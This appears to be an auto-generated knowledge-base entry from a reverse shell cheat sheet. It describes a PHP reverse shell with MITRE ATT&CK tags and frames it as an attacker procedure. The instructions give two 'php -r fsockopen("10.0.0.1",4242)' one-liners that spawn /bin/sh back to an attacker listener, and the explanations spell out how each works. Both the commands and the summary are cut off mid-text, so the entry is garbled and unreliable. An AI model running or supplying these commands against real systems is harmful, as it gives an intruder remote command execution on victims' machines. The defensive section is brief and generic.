---
id: 103d3413-8f8a-467e-ba22-a80d391a1910
name: PHP Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.291707+00:00'
updated_at: '2023-04-10T20:25:26.682983+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[PHP]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# PHP Reverse Shell

## Summary

The PHP Reverse Shell is a type of reverse shell that allows an attacker to establish a connection to a compromised system. This technique is commonly used by attackers to gain remote access to a target system and execute commands. The PHP Reverse Shell works by creating a connection between the at

## Description

# Description

The PHP Reverse Shell is a type of reverse shell that allows an attacker to establish a connection to a compromised system. This technique is commonly used by attackers to gain remote access to a target system and execute commands. The PHP Reverse Shell works by creating a connection between the attacker's machine and the target system, allowing the attacker to execute commands on the target system as if they were sitting in front of it.

From a technical perspective, the PHP Reverse Shell works by creating a PHP script that establishes a connection to the attacker's machine. Once the connection is established, the attacker can execute commands on the target system through the PHP script.

The business value of the PHP Reverse Shell is that it allows attackers to gain remote access to a target system, which can be used to steal sensitive data, install malware, or carry out other malicious activities.

## Requirements

1. Access to a vulnerable system

1. Knowledge of the target system's IP address and port number

1. A web server with PHP installed

## Defense

1. Implement strict access controls to limit who can access vulnerable systems

1. Monitor network traffic for suspicious activity, such as connections to known command and control servers

1. Use network segmentation to limit the impact of a compromised system

## Objectives

1. Establish a reverse shell connection to a target system

1. Execute commands on the target system as if you were sitting in front of it

# Instructions

1. Execute a reverse shell using PHP

**Code**: [[php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bi]]

> This command will establish a reverse shell connection to the specified IP address and port number using PHP. It uses the fsockopen() function to open a socket connection and then executes the /bin/sh shell with input/output redirection to establish the reverse shell. The shell can be accessed by the attacker from the listener on the specified IP address and port number.

2. To establish a reverse shell connection with a target machine, run the following command in your terminal.

**Code**: [[php -r '$sock=fsockopen("10.0.0.1",4242);$proc=pro]]

> This command uses PHP to create a socket connection with the target machine at IP address 10.0.0.1 on port 4242. It then opens a shell process on the target machine by executing the /bin/sh -i command. The shell process is connected to the socket using the $pipes variable, which allows for two-way communication between your machine and the target machine. This command can be used to gain remote access to a target machine and execute commands on it.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Tags

- [[PHP]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
